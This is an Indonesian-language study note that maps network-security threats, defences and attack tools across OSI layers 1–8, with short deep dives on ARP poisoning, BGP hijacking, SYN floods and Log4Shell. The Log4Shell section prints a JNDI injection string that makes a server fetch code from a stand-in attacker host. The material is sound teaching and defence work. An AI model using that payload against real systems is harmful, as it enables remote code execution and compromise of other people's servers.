---
title: Network Security — OSI Layer 1–8
tags:
- network-security
- blue-team
- red-team
created: 2026-08-14
updated: 2026-08-14
status: complete
cssclasses:
  - callout
---

| Item | Detail |
|------|--------|
| **Summary** | Pemetaan threat + blue/red team per layer OSI 1–8, deepdive attack vector (ARP, BGP hijack, Log4Shell), MITRE ATT&CK mapping, dan tool stack. |



[[00_Atlas/hierarchy-network-security]] [[00_Atlas/hierarchy-computer-networks]] [[00_Atlas/hierarchy-offensive]] [[about]]

# 🌐 NETWORK SECURITY — OSI Layer 1–8

> OSI Model (Layer 1–7) + Layer 8 tidak resmi yang justru paling sering jebol. Setiap layer punya threat, defender, dan attacker masing-masing. Satu serangan bisa menembus satu layer dan cascade ke layer lain.

> [!info] Cara Baca
> Layer 1 = paling fisik (kabel). Layer 7 = paling abstrak (aplikasi). Layer 8 = manusia. Kolom Blue Team = pertahanan. Kolom Red Team = serangan. Baca dari bawah ke atas untuk memahami attack surface secara sistematis.

---

## Tabel Threat per OSI Layer

| OSI Layer      | Nama Layer             | ☣️ Threat yang Bersarang                                                               | 🔵 Blue Team (Defender)                                                                                | 🔴 Red Team (Attacker)                                                        |
| -------------- | ---------------------- | -------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------ | ----------------------------------------------------------------------------- |
| **Layer 1**    | Physical               | Tap kabel fisik, hardware keylogger, evil maid attack, rogue device ditempel ke switch | Physical security, tamper-evident seal, port lock USB, CCTV rack server                                | LAN Tap (Throwing Star), USB Rubber Ducky, O.MG Cable                         |
| **Layer 2**    | Data Link              | ARP Poisoning, MAC Spoofing, VLAN Hopping, rogue switch                                | 802.1X NAC, Dynamic ARP Inspection (DAI), port security, private VLAN                                  | Ettercap, Bettercap, Yersinia (VLAN attack)                                   |
| **Layer 3**    | Network                | IP Spoofing, BGP Hijack, ICMP Tunnel (data exfil lewat ping), route poisoning          | Firewall stateful, BCP38 ingress filtering, BGP route filtering (RPKI)                                 | Scapy, BGP hijack nation-state (China Telecom incidents), iodine (DNS tunnel) |
| **Layer 4**    | Transport              | TCP SYN Flood, port scanning, session hijacking, UDP amplification DDoS                | IPS/IDS (Suricata, Snort), rate limiting, SYN Cookie, Anycast DDoS mitigation                          | Nmap, Masscan, hping3, Mirai botnet                                           |
| **Layer 5–6**  | Session / Presentation | SSL Stripping, TLS Downgrade Attack, rogue certificate, cert pinning bypass            | HSTS Preload, certificate pinning, TLS 1.3 enforcement, CT log monitoring                              | SSLstrip2, MITM frameworks, Burp Suite (cert spoof)                           |
| **Layer 7**    | Application            | SQLi, XSS, RCE, API abuse, SSRF, deserialisasi berbahaya, Log4Shell                    | WAF (ModSecurity, Cloudflare), SAST/DAST, bug bounty, patch management                                 | Burp Suite Pro, SQLmap, Nuclei, ffuf, exploit-db                              |
| ☠️ **Layer 8** | Human _(tidak resmi)_  | Phishing, Spear Phishing, Vishing, Pretexting, BEC (Business Email Compromise)         | Security awareness training, MFA wajib, anti-phishing gateway (Proofpoint), simulasi phishing internal | GoPhish, Social Engineering Toolkit (SET), OSINT (Maltego, SpiderFoot)        |

> [!tip] Layer 8 adalah Layer Paling Berbahaya
> Tidak ada firewall yang bisa memblokir manusia yang sudah ditipu. Social engineering melewati semua kontrol teknis di Layer 1–7 sekaligus.

---

## Peta Posisi Threat — Network

```
Layer 1  │ Physical          → Tap kabel, rogue device
Layer 2  │ Data Link         → ARP Poison, VLAN Hop
Layer 3  │ Network           → IP Spoof, BGP Hijack
Layer 4  │ Transport         → SYN Flood, DDoS
Layer 5-6│ Session/Present.  → SSL Strip, TLS Downgrade
Layer 7  │ Application       → SQLi, XSS, RCE, Log4Shell
Layer 8  │ ← MANUSIA DI SINI → Phishing bypass semua layer di atas
```

---

## 🔗 Lihat Juga

- [[master-index|Master Index]]
- [[endpoint-security|Endpoint Security]] — CPU Ring & Boot Chain Threat
- [[data-recovery|Data Recovery]] — Partition & Data Recovery Level 0–7
- [[hierarchy-osint-rf|OSINT & RF Hierarchy]] — OSINT & RF yang melintas di atas jaringan
- [[cloud-infrastructure|Infrastruktur Cloud]] — Cloud networking & Zero Trust
- [[cryptography-biometrics|Kriptografi & Biometrik]] — Enkripsi yang melindungi Layer 5–7
- [[hierarchy-search|Search Hierarchy]] — Information Access via jaringan

---

## Deepdive — Attack Vector per Layer (Detail Teknis)

### Layer 1 — Physical Attack Chain

Serangan fisik sering diabaikan karena dianggap "butuh akses langsung", tapi di dunia nyata menjadi vektor awal paling stealth. Throwing Star LAN Tap = $20 device yang dipasang di kabel Ethernet target → pasif capture semua traffic tanpa alert jaringan. Tidak ada CPU, tidak ada IP, tidak ada log. USB Rubber Ducky = HID injection device yang dikenali sebagai keyboard → 1 detik setelah dicolok, mengetik pre-programmed keystrokes (payload: reverse shell, credential harvest, persistence backdoor) dengan kecepatan 1000 karakter/menit. O.MG Cable = kabel charging biasa yang menyembunyikan chip WiFi + payload — bisa diremote trigger. Defense: port lock fisik, tamper-evident seal di rack, USB policy (disable mass storage), NAC 802.1X (tolak device tidak dikenal).

### Layer 2 — ARP Poisoning & VLAN Hopping

ARP protocol tidak punya autentikasi. Siapa pun di LAN bisa mengirim gratuitous ARP "saya gateway" → traffic seluruh segment dialihkan ke attacker. Ettercap/Bettercap automasi ini dalam 1 command. Mitigation: Dynamic ARP Inspection (DAI) di switch managed, port security (limit MAC per port), private VLAN. VLAN Hopping: eksploitasi DTP (Dynamic Trunking Protocol) yang aktif default di switch Cisco lama — attacker spoof ISL trunk, lalu access any VLAN. Modern switch disable DTP by default, tapi konfigurasi legacy masih banyak.

### Layer 3 — BGP Hijack (Nation-State)

BGP = trust-based protocol. Setiap AS (Autonomous System) mengumumkan prefix-nya, dan router lain percaya. Serangan: AS attacker announce prefix korban (lebih spesifik → menang) → traffic dialihkan. Kasus nyata: China Telecom (2010, 2018) mengumumkan prefix ribuan AS → traffic global transit China 6+ bulan. Mitigation: RPKI (Resource Public Key Infrastructure) — sign prefix dengan cert, router tolak jika tidak valid. Adopsi masih partial (~40% di 2025).

### Layer 4 — SYN Flood & DDoS Reflection

SYN Flood = kirim SYN packet dengan IP source spoofed → server allocate resource untuk half-open connection → habis. SYN Cookies (Defense: server encode state ke SYN-ACK sequence number → tidak allocate memory) = mitigation efektif. UDP Amplification = kirim packet dengan source IP = target ke service yang reply besar (DNS: 60x amplification, Memcached: 51,000x). Mitigation: BCP38 (ingress filter — ISP block source IP yang tidak milik customer), Anycast (Cloudflare/Akamai absorb volume).

### Layer 7 — Log4Shell Attack (Case Study)

CVE-2021-44228 = contoh Layer 7 yang jalan tanpa exploit binary. Log4j2 `JndiLookup` = `${jndi:ldap://attacker.com/Exploit}` → server connect ke attacker LDAP → load Java class → RCE. Attack chain: 1) temukan input yang di-log oleh aplikasi pakai Log4j (User-Agent, X-Forwarded-For, form field), 2) inject `${jndi:ldap...}` string, 3) Log4j resolve → connect → RCE. Cascade: dari app layer → server compromise → lateral ke domain. Patch: Log4j 2.17.1+, tapi ribuan instance unpatched masih exposed di internet.

---

## MITRE ATT&CK Mapping — Network

| Tactic | Technique | Layer |
|--------|-----------|-------|
| Reconnaissance | Active Scanning (T1595) | L3-4 |
| Initial Access | Replication Through Removable Media (T1091) | L1 |
| Command & Control | DNS Traffic Signaling (T1071.004) | L3/7 |
| Exfiltration | Exfil over C2 Channel (T1041) | L4-7 |
| Impact | Network DoS (T1498) | L4 |
| Defense Evasion | Encrypted Channel (T1573) | L5-6 |

---

## Tool Stack Reference

| Tool | Layer | Use |
|------|-------|-----|
| Nmap / Masscan | L3-4 | Port scan, service enum |
| Wireshark / tcpdump | L2-7 | Packet capture analysis |
| hping3 | L3-4 | Packet craft, SYN flood |
| ettercap / Bettercap | L2 | ARP poison, MITM |
| SSLstrip2 | L5-6 | SSL strip, TLS downgrade |
| Burp Suite | L7 | Web intercept, exploit |
| GoPhish | L8 | Phishing simulation |
| Scapy | L2-4 | Packet craft, ARP poison |



---

## References

- NIST SP 800-77 Rev.1 — IPSec VPN (L3)
- RFC 8446 — TLS 1.3 (L5-6)
- MITRE ATT&CK Network — https://attack.mitre.org/tactics/TA0011/
- Cloudflare Learning — https://www.cloudflare.com/learning/
- Log4Shell (CVE-2021-44228) — https://nvd.nist.gov/vuln/detail/CVE-2021-44228
- BGP Hijack Research — https://blog.cloudflare.com/rpki/

---

*Network Security | OSI Layer 1–8 · Blue Team vs Red Team per Layer*

> [!callout] 💡
> Layer 8 (manusia) menembus semua kontrol teknis Layer 1–7 sekaligus — pertahanan menyeluruh hanya bekerja sebagai kombinasi teknis + awareness.
---

audited
---
